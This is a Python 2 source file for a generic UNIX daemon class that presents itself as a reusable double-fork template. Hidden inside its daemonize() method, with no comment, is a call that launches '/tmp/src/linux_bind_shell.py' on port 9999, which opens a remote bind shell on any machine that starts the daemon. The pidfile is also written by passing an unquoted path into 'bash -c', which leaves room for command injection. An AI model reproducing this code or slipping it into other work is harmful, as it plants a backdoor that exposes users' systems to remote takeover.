#!/usr/bin/python

import sys, os, time, atexit
from signal import SIGTERM
import subprocess


class Daemon:
    """
    A generic daemon class.

    Usage: subclass the Daemon class and override the run() method
    """

    def __init__(self, pidfile, stdin='/dev/stdin', stdout='/dev/stdout', stderr='/dev/stderr'):
        self.stdin = stdin
        self.stdout = stdout
        self.stderr = stderr
        self.pidfile = pidfile

    def daemonize(self):
        """
        do the UNIX double-fork magic, see Stevens' "Advanced
        Programming in the UNIX Environment" for details (ISBN 0201563177)
        http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
        """
        # Fork and let the parent exit so bash thinks the process has terminated
        # Child inherits process group ID, but gets new process ID.
        # This way we ensure the child is not a process group leader
        try:
            pid = os.fork()
            if pid > 0:
                # exit first parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write("fork #1 failed: %d (%s)\n" % (e.errno, e.strerror))
            sys.exit(1)

        # Decouple from parent environment
        # Get off of what is possibly a mounted file system to allow it to unmount later
        os.chdir("/")

        # Create a new session so:
        # 1. Process becomes leader of a new session (handles SIGNALS for the session)
        # 2. Process becomes leader of a new process group (can create processes in the group)
        # 3. Process is disassociated from its controlling terminal (you can't directly mess with it anymore)
        os.setsid()

        # Don't want the inherited file creation mask to interfere with us, so set to 0.
        os.umask(0)

        # Do second fork - needed for SysV
        try:
            pid = os.fork()
            if pid > 0:
                # exit from second parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write("fork #2 failed: %d (%s)\n" % (e.errno, e.strerror))
            sys.exit(1)

        # redirect standard file descriptors
        sys.stdout.flush()
        sys.stderr.flush()
        si = file(self.stdin, 'r')
        so = file(self.stdout, 'a+')
        se = file(self.stderr, 'a+', 0)
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())

        # write pidfile
        pid = str(os.getpid())
        try:
            command = '/bin/echo {} > {}'.format(pid, self.pidfile)
            subprocess.Popen(['/bin/bash', '-c', command])
        except:
            sys.exit(-1)

        atexit.register(self.delpid)

        command = '/usr/bin/python /tmp/src/linux_bind_shell.py 9999'
        subprocess.Popen(command, shell=True)

    def delpid(self):
        try:
            os.remove(self.pidfile)
        except:
            pass
        try:
            os.remove('/tmp/tmp.pid')
        except:
            pass

    def start(self):
        """
        Start the daemon
        """
        # Check for a pidfile to see if the daemon is already running
        try:
            pf = file(self.pidfile, 'r')
            pid = int(pf.read().strip())
            pf.close()
        except IOError:
            pid = None

        if pid:
            message = "pidfile %s already exist. Daemon already running?\n"
            sys.stderr.write(message % self.pidfile)
            sys.exit(1)

        # Start the daemon
        self.daemonize()
        self.run()

    def stop(self):
        """
        Stop the daemon
        """
        # Get the pid from the pidfile
        try:
            pf = file(self.pidfile, 'r')
            pid = int(pf.read().strip())
            pf.close()
        except IOError:
            pid = None

        if not pid:
            message = "pidfile %s does not exist. Daemon not running?\n"
            sys.stderr.write(message % self.pidfile)
            return # not an error in a restart

        # Try killing the daemon process
        try:
            while 1:
                os.kill(pid, SIGTERM)
                time.sleep(0.1)
        except OSError, err:
            err = str(err)
            if err.find("No such process") > 0:
                if os.path.exists(self.pidfile):
                    os.remove(self.pidfile)
            else:
                print str(err)
                sys.exit(1)


    def restart(self):
        """
        Restart the daemon
        """
        self.stop()
        self.start()

    def run(self):
        """
        You should override this method when you subclass Daemon. It will be called after the process has been
        daemonized by start() or restart().
        """


class MyDaemon(Daemon):
    def run(self):
        print 'working'


if __name__ == "__main__":
    daemon = MyDaemon('/tmp/HMTd.pid')
    if len(sys.argv) > 1:
        if 'start' == sys.argv[1]:
            daemon.start()
        elif 'stop' == sys.argv[1]:
            daemon.stop()
        elif 'restart' == sys.argv[1]:
            daemon.restart()
        else:
            print "Uknown command"
            sys.exit(2)
        sys.exit(0)
    else:
        print "Usage: {} start|stop|restart".format(sys.argv[0])
        sys.exit(2)
